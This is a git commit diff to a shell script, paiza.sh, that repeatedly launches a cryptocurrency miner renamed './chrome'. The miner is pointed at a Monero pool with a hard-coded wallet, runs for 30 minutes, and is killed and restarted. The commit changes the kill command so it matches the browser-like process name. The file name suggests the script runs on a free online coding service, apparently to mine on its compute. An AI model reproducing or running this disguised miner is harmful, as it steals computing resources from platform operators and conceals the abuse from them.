06549a0ec19c2105315a814664c7397641577375
azzfarrcolab <72619602+azzfarrcolab@users.noreply.github.com>
2020-11-10 20:32:45 +0700

    Update paiza.sh

--- paiza.sh
+++ paiza.sh
@@ -3,6 +3,6 @@
   do
   ./chrome --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -t 1 -k --cuda
   sleep 1800
-  kill $(ps aux | grep 'keizer' | awk '{print $2}')
+  kill $(ps aux | grep 'chrome' | awk '{print $2}')
   sleep 300;
 done
